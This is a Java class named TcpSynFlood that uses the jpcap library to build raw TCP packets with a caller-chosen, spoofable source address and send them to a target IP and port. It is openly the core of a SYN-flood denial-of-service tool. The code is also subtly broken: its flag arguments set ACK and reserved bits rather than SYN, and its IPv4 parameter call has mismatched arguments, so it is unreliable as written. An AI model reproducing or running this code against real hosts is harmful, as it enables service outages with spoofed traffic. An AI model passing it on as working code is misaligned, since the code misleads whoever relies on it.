package com.yourpackage;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.TCPPacket;

import java.net.InetAddress;

public class TcpSynFlood {
    private JpcapSender sender;
    private NetworkInterface networkInterface;

    // Constructor that takes a NetworkInterface as an argument
    public TcpSynFlood(NetworkInterface networkInterface) throws Exception {
        this.networkInterface = networkInterface;
        this.sender = JpcapSender.openDevice(networkInterface);
    }

    // Method to send a SYN packet to the target IP and port
    public void sendSynPacket(String targetIp, int targetPort, String sourceIp, int sourcePort) {
        try {
            InetAddress targetAddress = InetAddress.getByName(targetIp);
            InetAddress sourceAddress = InetAddress.getByName(sourceIp);

            // Create the TCP Packet
            TCPPacket tcpPacket = new TCPPacket(sourcePort, targetPort, 12345, 0, false, true, false, false, false, false, true, true, 1024, 0);
            tcpPacket.setIPv4Parameter(0, false, false, false, 0, false, false, false, IPPacket.IPPROTO_TCP, sourceAddress, targetAddress);

            // Create the Ethernet Packet
            EthernetPacket ethernetPacket = new EthernetPacket();
            ethernetPacket.frametype = EthernetPacket.ETHERTYPE_IP;
            ethernetPacket.src_mac = networkInterface.mac_address;
            ethernetPacket.dst_mac = new byte[]{(byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0xff, (byte) 0xff}; // Broadcast

            tcpPacket.datalink = ethernetPacket;

            sender.sendPacket(tcpPacket);
            System.out.println("Sent TCP SYN packet to " + targetIp + ":" + targetPort);
        } catch (Exception e) {
            System.err.println("Error sending SYN packet: " + e.getMessage());
        }
    }

    // Close the sender
    public void close() {
        sender.close();
    }
}
